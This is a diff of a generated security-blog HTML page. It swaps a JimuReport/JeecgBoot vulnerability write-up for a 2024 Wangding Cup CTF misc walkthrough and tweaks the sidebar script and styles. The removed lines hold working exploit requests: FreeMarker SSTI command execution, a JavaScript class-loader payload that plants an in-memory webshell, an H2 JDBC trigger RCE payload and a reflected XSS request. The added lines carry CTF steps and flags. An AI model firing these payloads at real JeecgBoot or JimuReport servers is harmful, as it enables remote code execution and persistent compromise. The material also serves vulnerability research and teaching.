@@ -29,42 +29,46 @@
 <meta property="og:type" content="website" />
 <meta property="og:title" content="© 哨兵" />
 <meta property="og:description" content=" &lt;script&gt;
-	document.addEventListener(&#39;DOMContentLoaded&#39;, function() {
+	document.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {
 		const button = document.getElementById(&#39;toggleButton&#39;);
 		const sidebar = document.getElementById(&#39;sidebar1&#39;);
-
-		// 找到所有具有指定 class 的 details 元素
 		const ulsElements = document.querySelectorAll(&#39;ul.nav.nav-pills.nav-stacked&#39;);
+		const logoElement = document.getElementById(&#39;logo&#39;);
+		const figmaElements = document.querySelectorAll(&#39;.new_figma_des&#39;); // 选中所有 new_figma_des 元素
 
-		button.addEventListener(&#39;click&#39;, function() {
-			// 切换 sidebar 的 collapsed 状态
-			sidebar.classList.toggle(&#39;collapsed&#39;);
-			const expanded = !sidebar.classList.contains(&#39;collapsed&#39;);
-			button.setAttribute(&#39;aria-expanded&#39;, expanded);
+		if (!button || !sidebar) return; // 确保必要的元素存在，避免错误
 
-			// 切换 details 元素的显示状态
-			ulsElements.forEach(details =&gt; {
-				details.style.display = details.style.display === &#39;none&#39; ? &#39;&#39; : &#39;none&#39;;
+		button.addEventListener(&#39;click&#39;, () =&gt; {
+			const isCollapsed = sidebar.classList.toggle(&#39;collapsed&#39;);
+			button.setAttribute(&#39;aria-expanded&#39;, !isCollapsed);
+
+			// 切换 ul 元素的显示状态
+			[...ulsElements, logoElement].forEach(element =&gt; {
+				if (element) element.style.display = isCollapsed ? &#39;none&#39; : &#39;&#39;;
+			});
+
+			// 切换 .new_figma_des 的 padding
+			figmaElements.forEach(element =&gt; {
+				element.style.padding = isCollapsed ? &#39;0px&#39; : &#39;32px&#39;;
 			});
 		});
 	});
 &lt;/script&gt;
 
 &lt;style&gt;
-	.new_figma_des{
-	display: flex;
-	flex-direction: column;
-	flex-wrap: wrap;
-	justify-content: space-between;
-	align-items: center;
-	align-content: center;
-	padding: 0;
-	flex: none;
-	order: 0;
-	align-self: stretch;
-	flex-grow: 0;
-	z-index: 1;
+	.new_figma_des {
+		display: flex;
+		flex-direction: row;
+		justify-content: space-between;
+		align-items: center;
+		align-content: center;
+		flex: none;
+		order: 0;
+		align-self: stretch;
+		padding: 32px;
+		transition: padding 0.3s ease; /* 添加过渡效果 */
 	}
+
 	#toggleButton {
 		transition: opacity 0.3s;
 		background-color: transparent;
@@ -77,16 +81,10 @@
 	#sidebar1.collapsed {
 		width: 65px;
 	}
-	 .c_k {
-		 width: 100%;
-	 }
 	#sidebar1.collapsed #logo,
 	#sidebar1.collapsed #toggleButton {
 		opacity: 1; /* 保持可见 */
 	}
-	 .c_k {
-		 width: 100%;
-	 }
 &lt;/style&gt;
 
 
@@ -117,15 +115,12 @@
                 --&gt;
                 &lt;div&gt;
                     &lt;picture&gt;
+  &lt;source srcset=&quot;/assets/img/logo-small-dark.png 1x,/assets/img/logo-small-dark@2x.png 2x,/assets/img/logo-small-dark@3x.png 3x,/assets/img/logo-small-dark@4x.png 4x,&quot; media=&quot;(prefers-color-scheme: dark)&quot; /&gt;
   
-  
-  &lt;source srcset=&quot;/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x&quot; media=&quot;(prefers-color-scheme: dark)&quot; /&gt;
-  
-  
-  
-  &lt;img src=&quot;/assets/img/logo-small.jpg&quot; srcset=&quot;/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x&quot; /&gt;
+  &lt;img src=&quot;/assets/img/logo-small.logo-small&quot; srcset=&quot;/assets/img/logo-small.png 1x,/assets/img/logo-small@2x.png 2x,/assets/img/logo-small@3x.png 3x,/assets/img/logo-small@4x.png 4x,&quot; /&gt;
   
 &lt;/picture&gt;
+
                     
                 &lt;/div&gt;
                 &lt;div&gt;
@@ -158,34 +153,70 @@
 			&lt;div class=&quot;form-group&quot;&gt;&lt;details&gt;
 				
 					
+				
+					
+				
+					
+				
+					
+				
+					
+				
+					
+				
+					
+				
+					
+				
+					
+				
+					
 					&lt;summary class=&quot;edSFyN flex justify-between&quot;&gt;
-						&lt;a&gt;&lt;strong&gt;JMREPORT&lt;/strong&gt;&lt;/a&gt;
+						&lt;a&gt;&lt;strong&gt;CTF&lt;/strong&gt;&lt;/a&gt;
 					&lt;/summary&gt;
 					
 					&lt;ul class=&quot;nav nav-pills nav-stacked&quot;&gt;
-						&lt;li id=&quot;toc-JimuReport Vuln WalkThrough backup&quot; class=&quot;table-of-contents table-of-contents__left-border  active&quot;&gt;
-							&lt;a href=&quot;/about/JimuReport-Vuln-WalkThrough-backup/&quot;&gt;I. JIMUREPORT VULN WALKTHROUGH BACKUP&lt;/a&gt;
+						&lt;li id=&quot;toc-CTF - 代码审计向&quot; class=&quot;table-of-contents table-of-contents__left-border &quot;&gt;
+							&lt;a href=&quot;/about/CTF-Code-Audit-WalkThrough/&quot;&gt;I. CTF - 代码审计向&lt;/a&gt;
 						&lt;/li&gt;
 					&lt;/ul&gt;
 					
+					&lt;ul class=&quot;nav nav-pills nav-stacked&quot;&gt;
+						&lt;li id=&quot;toc-CTF - 杂项&quot; class=&quot;table-of-contents table-of-contents__left-border &quot;&gt;
+							&lt;a href=&quot;/about/CTF-Misc-WalkThrough/&quot;&gt;II. CTF - 杂项&lt;/a&gt;
+						&lt;/li&gt;
+					&lt;/ul&gt;
 					
-				
+					&lt;ul class=&quot;nav nav-pills nav-stacked&quot;&gt;
+						&lt;li id=&quot;toc-CTF - 密码学与杂项&quot; class=&quot;table-of-contents table-of-contents__left-border &quot;&gt;
+							&lt;a href=&quot;/about/CTF-Crypto-and-Misc-etc-WalkThrough/&quot;&gt;III. CTF - 密码学与杂项&lt;/a&gt;
+						&lt;/li&gt;
+					&lt;/ul&gt;
 					
-				
+					&lt;ul class=&quot;nav nav-pills nav-stacked&quot;&gt;
+						&lt;li id=&quot;toc-2022年网鼎杯玄武组-解题记录&quot; class=&quot;table-of-contents table-of-contents__left-border &quot;&gt;
+							&lt;a href=&quot;/about/WANGDINGCTF2022-Walkthrough/&quot;&gt;IV. 2022年网鼎杯玄武组-解题记录&lt;/a&gt;
+						&lt;/li&gt;
+					&lt;/ul&gt;
 					
-				
+					&lt;ul class=&quot;nav nav-pills nav-stacked&quot;&gt;
+						&lt;li id=&quot;toc-2022年网鼎杯玄武组赛题复盘-[Web-FindIT]&quot; class=&quot;table-of-contents table-of-contents__left-border &quot;&gt;
+							&lt;a href=&quot;/about/WANGDINGCTF2022-WEB-FindIT-Walkthrough/&quot;&gt;V. 2022年网鼎杯玄武组赛题复盘-[WEB-FINDIT]&lt;/a&gt;
+						&lt;/li&gt;
+					&lt;/ul&gt;
 					
-				
+					&lt;ul class=&quot;nav nav-pills nav-stacked&quot;&gt;
+						&lt;li id=&quot;toc-2022年网鼎杯玄武组赛题复盘-[Web-ezJava]&quot; class=&quot;table-of-contents table-of-contents__left-border &quot;&gt;
+							&lt;a href=&quot;/about/WANGDINGCTF2022-WEB-ezJava-Walkthrough/&quot;&gt;VI. 2022年网鼎杯玄武组赛题复盘-[WEB-EZJAVA]&lt;/a&gt;
+						&lt;/li&gt;
+					&lt;/ul&gt;
 					
-				
+					&lt;ul class=&quot;nav nav-pills nav-stacked&quot;&gt;
+						&lt;li id=&quot;toc-2024年网鼎杯玄武组赛题历程&quot; class=&quot;table-of-contents table-of-contents__left-border  active&quot;&gt;
+							&lt;a href=&quot;/about/WANGDINGCTF2024-Walkthrough/&quot;&gt;VII. 2024年网鼎杯玄武组赛题历程&lt;/a&gt;
+						&lt;/li&gt;
+					&lt;/ul&gt;
 					
-				
-					
-				
-					
-				
-					
-				
 					
 				
 					
@@ -214,40 +245,34 @@
 				&lt;div tabindex=&quot;-1&quot; class=&quot;position-sticky navbar-default top-0 color-bg-default new_figma_des&quot; style=&quot;z-index:3&quot;&gt;
 					&lt;a href=&quot;/&quot; target=&quot;blank&quot; id=&quot;logo&quot;&gt;
 						&lt;picture&gt;
+  &lt;source srcset=&quot;/assets/img/logo-small-dark.png 1x,/assets/img/logo-small-dark@2x.png 2x,/assets/img/logo-small-dark@3x.png 3x,/assets/img/logo-small-dark@4x.png 4x,&quot; media=&quot;(prefers-color-scheme: dark)&quot; /&gt;
   
-  
-  &lt;source srcset=&quot;/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x&quot; media=&quot;(prefers-color-scheme: dark)&quot; /&gt;
-  
-  
-  
-  &lt;img src=&quot;/assets/img/logo-small.jpg&quot; srcset=&quot;/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x&quot; /&gt;
+  &lt;img src=&quot;/assets/img/logo-small.logo-small&quot; srcset=&quot;/assets/img/logo-small.png 1x,/assets/img/logo-small@2x.png 2x,/assets/img/logo-small@3x.png 3x,/assets/img/logo-small@4x.png 4x,&quot; /&gt;
   
 &lt;/picture&gt;
+
 						
 					&lt;/a&gt;
 
-					&lt;a id=&quot;toggleButton&quot; aria-expanded=&quot;true&quot; aria-label=&quot;折叠边栏&quot; class=&quot;c_fp c_fq c_es c_fr c_eu c_ev c_ew c_ex c_dc c_c c_k&quot;&gt;
+					&lt;a id=&quot;toggleButton&quot; aria-expanded=&quot;true&quot; aria-label=&quot;折叠边栏&quot; class=&quot;&quot;&gt;
 						&lt;picture&gt;
+  &lt;source srcset=&quot;/assets/img/expand-icon-dark.png 1x,/assets/img/expand-icon-dark@2x.png 2x,/assets/img/expand-icon-dark@3x.png 3x,&quot; media=&quot;(prefers-color-scheme: dark)&quot; /&gt;
   
-  
-  &lt;source srcset=&quot;/assets/img/expand-icon-dark.png 1x, /assets/img/expand-icon-dark@2x.png 2x&quot; media=&quot;(prefers-color-scheme: dark)&quot; /&gt;
-  
-  
-  
-  &lt;img src=&quot;/assets/img/expand-icon.png&quot; srcset=&quot;/assets/img/expand-icon.png 1x, /assets/img/expand-icon@2x.png 2x&quot; /&gt;
+  &lt;img src=&quot;/assets/img/expand-icon.expand-icon&quot; srcset=&quot;&quot; /&gt;
   
 &lt;/picture&gt;
+
 					&lt;/a&gt;
 				&lt;/div&gt;
 				&lt;ul id=&quot;help-nav&quot; aria-expanded=&quot;true&quot; class=&quot;nav nav-pills nav-stacked&quot; &gt;
 					
-					&lt;details open&gt;
+					&lt;details &gt;
 						&lt;summary class=&quot;edSFyN flex justify-between&quot;&gt;&lt;!--left - detail - summary--&gt;
 							&lt;a class=&quot;no-underline&quot;&gt;&lt;strong&gt;JMREPORT&lt;/strong&gt;&lt;/a&gt;
 						&lt;/summary&gt;
 						
 						&lt;ul class=&quot;nav nav-pills nav-stacked no-underline&quot;&gt;
-							&lt;li id=&quot;toc-JimuReport Vuln WalkThrough backup&quot; class=&quot;table-of-contents table-of-contents__left-border  active&quot;&gt;
+							&lt;li id=&quot;toc-JimuReport Vuln WalkThrough backup&quot; class=&quot;table-of-contents table-of-contents__left-border &quot;&gt;
 								&lt;a href=&quot;/about/JimuReport-Vuln-WalkThrough-backup/&quot;&gt;I. JIMUREPORT VULN WALKTHROUGH BACKUP&lt;/a&gt;
 								
 							&lt;/li&gt;
@@ -409,7 +434,7 @@
 						
 					&lt;/details&gt;
 					
-					&lt;details &gt;
+					&lt;details open&gt;
 						&lt;summary class=&quot;edSFyN flex justify-between&quot;&gt;&lt;!--left - detail - summary--&gt;
 							&lt;a class=&quot;no-underline&quot;&gt;&lt;strong&gt;CTF&lt;/strong&gt;&lt;/a&gt;
 						&lt;/summary&gt;
@@ -452,6 +477,13 @@
 						&lt;ul class=&quot;nav nav-pills nav-stacked no-underline&quot;&gt;
 							&lt;li id=&quot;toc-2022年网鼎杯玄武组赛题复盘-[Web-ezJava]&quot; class=&quot;table-of-contents table-of-contents__left-border &quot;&gt;
 								&lt;a href=&quot;/about/WANGDINGCTF2022-WEB-ezJava-Walkthrough/&quot;&gt;VI. 2022年网鼎杯玄武组赛题复盘-[WEB-EZJAVA]&lt;/a&gt;
+								
+							&lt;/li&gt;
+						&lt;/ul&gt;
+						
+						&lt;ul class=&quot;nav nav-pills nav-stacked no-underline&quot;&gt;
+							&lt;li id=&quot;toc-2024年网鼎杯玄武组赛题历程&quot; class=&quot;table-of-contents table-of-contents__left-border  active&quot;&gt;
+								&lt;a href=&quot;/about/WANGDINGCTF2024-Walkthrough/&quot;&gt;VII. 2024年网鼎杯玄武组赛题历程&lt;/a&gt;
 								
 							&lt;/li&gt;
 						&lt;/ul&gt;
@@ -673,7 +705,7 @@
                 研究
                  &lt;/a&gt;/
                         &lt;a class=&quot;px-md-6 white f2 fw4 items-center&quot;&gt;
-                             JMReport 
+                             CTF 
                         &lt;/a&gt;
                         &lt;!--article author end--&gt;
 
@@ -702,7 +734,7 @@
 
         
             
-            on Aug 1, 2024
+            on Dec 15, 2024
             
         
     &lt;/a&gt;
@@ -720,82 +752,44 @@
 							&lt;span class=&quot;post-print pull-right&quot;&gt;&lt;a onclick=&quot;printpage()&quot;&gt;&lt;!--href=&quot;javascript:window.print()&quot;--&gt;
 							&lt;ion-icon&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;49&quot; height=&quot;49&quot; viewBox=&quot;0 0 512 512&quot; style=&quot;fill:currentColor;stroke:none;&quot;&gt;&lt;title&gt;Print document&lt;/title&gt;&lt;path d=&quot;M400,96V56a8,8,0,0,0-8-8H120a8,8,0,0,0-8,8V96&quot;/&gt;&lt;rect x=&quot;152&quot; y=&quot;264&quot; width=&quot;208&quot; height=&quot;160&quot; rx=&quot;4&quot; ry=&quot;4&quot; style=&quot;fill:none;stroke:none;&quot;/&gt;&lt;path d=&quot;M408,112H104a56,56,0,0,0-56,56V376a8,8,0,0,0,8,8h56v72a8,8,0,0,0,8,8H392a8,8,0,0,0,8-8V384h56a8,8,0,0,0,8-8V168A56,56,0,0,0,408,112ZM360,420a4,4,0,0,1-4,4H156a4,4,0,0,1-4-4V268a4,4,0,0,1,4-4H356a4,4,0,0,1,4,4ZM394,207.92a24,24,0,1,1,22-22A24,24,0,0,1,394,207.92Z&quot;/&gt;&lt;/svg&gt;
 							&lt;/ion-icon&gt;&lt;/a&gt;&lt;/span&gt;
-							&lt;span class=&quot;post-print pull-right&quot;&gt;&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/edit/main/_posts/about/JMReport/2024-08-01-JMReport-Code-Execute-Vuln.md&quot; target=&quot;_blank&quot;&gt;
+							&lt;span class=&quot;post-print pull-right&quot;&gt;&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/edit/main/_posts/about/CTF/2024-12-15-2024-网鼎杯-白虎-walkthrough.md&quot; target=&quot;_blank&quot;&gt;
 							&lt;ion-icon&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;49&quot; height=&quot;49&quot; viewBox=&quot;0 0 512 512&quot; style=&quot;fill:currentColor;stroke:none;&quot;&gt;&lt;title&gt;Edit on github&lt;/title&gt;&lt;path d=&quot;M459.94,53.25a16.06,16.06,0,0,0-23.22-.56L424.35,65a8,8,0,0,0,0,11.31l11.34,11.32a8,8,0,0,0,11.34,0l12.06-12C465.19,69.54,465.76,59.62,459.94,53.25Z&quot;/&gt;&lt;path d=&quot;M399.34,90,218.82,270.2a9,9,0,0,0-2.31,3.93L208.16,299a3.91,3.91,0,0,0,4.86,4.86l24.85-8.35a9,9,0,0,0,3.93-2.31L422,112.66A9,9,0,0,0,422,100L412.05,90A9,9,0,0,0,399.34,90Z&quot;/&gt;&lt;path d=&quot;M386.34,193.66,264.45,315.79A41.08,41.08,0,0,1,247.58,326l-25.9,8.67a35.92,35.92,0,0,1-44.33-44.33l8.67-25.9a41.08,41.08,0,0,1,10.19-16.87L318.34,125.66A8,8,0,0,0,312.69,112H104a56,56,0,0,0-56,56V408a56,56,0,0,0,56,56H344a56,56,0,0,0,56-56V199.31A8,8,0,0,0,386.34,193.66Z&quot;/&gt;&lt;/svg&gt;
 							&lt;/ion-icon&gt;
 							&lt;/a&gt;&lt;/span&gt;
 						&lt;/h1&gt;
-						&lt;h1 id=&quot;ref&quot;&gt;REF&lt;/h1&gt;
+						&lt;h1 id=&quot;1misc01&quot;&gt;1、MISC01&lt;/h1&gt;
+
+&lt;h2 id=&quot;11赛题描述&quot;&gt;1.1、赛题描述&lt;/h2&gt;
+
+&lt;h2 id=&quot;12解题思路&quot;&gt;1.2、解题思路&lt;/h2&gt;
+
+&lt;p&gt;根据提示寻找异常 GTP 协议中异常的 teid，将 teid 作为列导出所有 GTP 流量：&lt;/p&gt;
+
+&lt;p&gt;生成 csv 文件如下，在 GTP 报文中，TEID 应该是唯一的，确保报文的正确解析和处理，多个 TEID 的存在可能会被视为攻击迹象，例如：&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/13558&quot; target=&quot;_blank&quot;&gt;xz community:: JimuReport ＜= v1.6.0 漏洞分析&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;&quot; target=&quot;_blank&quot;&gt;Github:wy876: https://github.com/wy876/POC/blob/main/JeecgBoot%E6%BC%8F%E6%B4%9E.md&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/wy876/POC/blob/main/JeecgBoot%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E.md&quot; target=&quot;_blank&quot;&gt;Github:wy876: JeecgBoot反射型XSS漏洞&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;重放攻击或伪造报文，发现构造的 teid 如下：&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&quot;jeecgboot-sql注入漏洞&quot;&gt;JeecgBoot sql注入漏洞&lt;/h2&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
-Host: 192.168.90.1:3100
-Origin: http://192.168.90.1:3100
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
-Accept: */*
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Connection: close
-Content-Type: application/json
-Content-Length: 123
+&lt;p&gt;根据提示排列生成 flag： wdflag{1934614239214098}&lt;/p&gt;
 
-{&quot;sql&quot;:&quot;select &#39;result:&amp;lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&amp;gt; ${ ex(\&quot;open -a calculator.app  \&quot;) }&#39; &quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;queryfieldbysql-注入内存马&quot;&gt;queryFieldBySql 注入内存马&lt;/h2&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;sql&quot;:&quot;call${\&quot;freemarker.template.utility.ObjectConstructor\&quot;?new()(\&quot;javax.script.ScriptEngineManager\&quot;).getEngineByName(\&quot;js\&quot;).eval(\&quot;classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass(&#39;org.apachen.SOAPUtils&#39;).newInstance();}catch(e){clsString=classLoader.loadClass(&#39;java.lang.String&#39;);bytecodeBase64=&#39;这里填入base64的内存马&#39;;try{clsBase64=classLoader.loadClass(&#39;java.util.Base64&#39;);clsDecoder=classLoader.loadClass(&#39;java.util.Base64$Decoder&#39;);decoder=clsBase64.getMethod(&#39;getDecoder&#39;).invoke(base64Clz);bytecode=clsDecoder.getMethod(&#39;decode&#39;,clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass(&#39;javax.xml.bind.DatatypeConverter&#39;);bytecode=datatypeConverterClz.getMethod(&#39;parseBase64Binary&#39;,clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass(&#39;sun.misc.BASE64Decoder&#39;);bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass(&#39;java.lang.ClassLoader&#39;);clsByteArray=(&#39;&#39;.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod(&#39;defineClass&#39;,[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\&quot;)}&quot;,&quot;dbSource&quot;:&quot;&quot;,&quot;type&quot;:&quot;0&quot;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;使用内存马工具生成payload，将生成的base64格式的内存马 替换payload 中bytecodeBase64的值&lt;/p&gt;
+&lt;h1 id=&quot;2misc04&quot;&gt;2、MISC04&lt;/h1&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://github.com/wy876/POC/assets/139549762/55a9877c-c111-4897-a665-8f58e9de5300&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;21赛题描述&quot;&gt;2.1、赛题描述&lt;/h2&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://github.com/wy876/POC/assets/139549762/03a476fa-7d2a-4221-9c96-c5b60040adfd&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;22解题思路&quot;&gt;2.2、解题思路&lt;/h2&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://github.com/wy876/POC/assets/139549762/24b6b0b2-419c-43d1-a0c8-8ced440e0a79&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;binwalk 分析
+使用 binwalk 分析文件，发现 1 文件为 zip 文件，并附第一张翻转图片和密码，提醒需要爆破四位数：&lt;/p&gt;
 
-&lt;p&gt;内存马路径：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.18.131:8080/jeecg-boot/jmreport/queryFieldBySql/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;生成字典后，利用爆破出正确用户名密码：&lt;/p&gt;
 
-&lt;h2 id=&quot;jeecgboot-ssti-漏洞&quot;&gt;JeecgBoot SSTI 漏洞&lt;/h2&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /jeecgboot/jmreport/testConnection HTTP/1.1
-Host: 192.168.90.1:3100
-Content-Length: 383
-Accept: application/json, text/plain, */*
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
-Content-Type: application/json;charset=UTF-8
-Origin: http://192.168.90.1:3100
-Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Connection: close
+&lt;p&gt;使用图片 crc 计算工具暴力破解获得图片：&lt;/p&gt;
 
-{
-  &quot;id&quot;: &quot;1&quot;,
-  &quot;code&quot;: &quot;dataSource1&quot;,
-  &quot;dbType&quot;: &quot;H2&quot;,
-  &quot;dbDriver&quot;: &quot;org.h2.Driver&quot;,
-  &quot;dbUrl&quot;: &quot;jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec(&#39;open -a calculator.app&#39;)\u000A$$&quot;,
-  &quot;dbName&quot;: &quot;test&quot;,
-  &quot;dbUsername&quot;: &quot;sa&quot;,
-  &quot;dbPassword&quot;: &quot;&quot;,
-  &quot;connectTimes&quot;: 5
-}
+&lt;p&gt;成功获取到 flag。
+wdflag{1234576eee739d811904bea4860s4eg5}&lt;/p&gt;
 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
-&lt;p&gt;https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/&lt;/p&gt;
-
-&lt;h1 id=&quot;jeecgboot反射型xss漏洞&quot;&gt;JeecgBoot反射型XSS漏洞&lt;/h1&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /userController.do?%3CsCrIpT%3Ealert(document.domain)%3C/sCrIpT%3E HTTP/1.1
-Host: 
-User-Agent: Mozilla/5.0 (Macintosh; Intel MacOS X 10.15; rv:126.0) Gecko/20100101Firefox/126.0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;3&quot;&gt;3、…&lt;/h1&gt;
 
 					&lt;/div&gt;
 					&lt;div class=&quot;spacing&quot;&gt;&lt;/div&gt;
@@ -809,7 +803,7 @@ User-Agent: Mozilla/5.0 (Macintosh; Intel MacOS X 10.15; rv:126.0) Gecko/2010010
 			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix &quot;&gt;
 				&lt;h2 class=&quot;lead&quot;&gt;申明&lt;/h2&gt;
 				&lt;div&gt;
-					&lt;div class=&quot;mb-2&quot;&gt;&lt;a href=&quot;/about/JimuReport-Vuln-WalkThrough-backup/&quot; target=&quot;_blank&quot; class=&quot; text-bold&quot;&gt;
+					&lt;div class=&quot;mb-2&quot;&gt;&lt;a href=&quot;/about/WANGDINGCTF2024-Walkthrough/&quot; target=&quot;_blank&quot; class=&quot; text-bold&quot;&gt;
 						&lt;div class=&quot;fa fa-link&quot;&gt;&lt;/div&gt;
 						转载请申明本文档链接&lt;/a&gt;&lt;/div&gt;
 					&lt;div&gt;&lt;a href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;  class=&quot;text-bold&quot;&gt;
@@ -821,7 +815,7 @@ User-Agent: Mozilla/5.0 (Macintosh; Intel MacOS X 10.15; rv:126.0) Gecko/2010010
 			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
 				&lt;h2 class=&quot;lead&quot;&gt;贡献开源文档&lt;/h2&gt;
 				&lt;div&gt;
-					&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/about/JMReport/2024-08-01-JMReport-Code-Execute-Vuln.md&quot; target=&quot;_blank&quot; class=&quot;no-underline btn mr-1 color-border-accent-emphasis&quot;&gt;
+					&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/about/CTF/2024-12-15-2024-网鼎杯-白虎-walkthrough.md&quot; target=&quot;_blank&quot; class=&quot;no-underline btn mr-1 color-border-accent-emphasis&quot;&gt;
 						&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; role=&quot;img&quot; class=&quot;octicon mr-1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot; height=&quot;16&quot; fill=&quot;currentColor&quot; style=&quot;display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
 						贡献当前开源文档
 					&lt;/a&gt;
@@ -836,7 +830,7 @@ User-Agent: Mozilla/5.0 (Macintosh; Intel MacOS X 10.15; rv:126.0) Gecko/2010010
 					&lt;div class=&quot;fa fa-thumbs-o-up&quot;&gt;&lt;/div&gt;
 				&lt;/span&gt;
 				&lt;/a&gt;
-				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&amp;template=2-bug_report.yaml&amp;title=_posts/about/JMReport/2024-08-01-JMReport-Code-Execute-Vuln.md&amp;nbsp;JimuReport Vuln WalkThrough backup | © 哨兵 | SENTINEL SECURITY, LAB&quot; target=&quot;_blank&quot;&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&amp;template=2-bug_report.yaml&amp;title=_posts/about/CTF/2024-12-15-2024-网鼎杯-白虎-walkthrough.md&amp;nbsp;2024年网鼎杯玄武组赛题历程 | © 哨兵 | SENTINEL SECURITY, LAB&quot; target=&quot;_blank&quot;&gt;
 				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;本文档有问题?&quot;&gt;
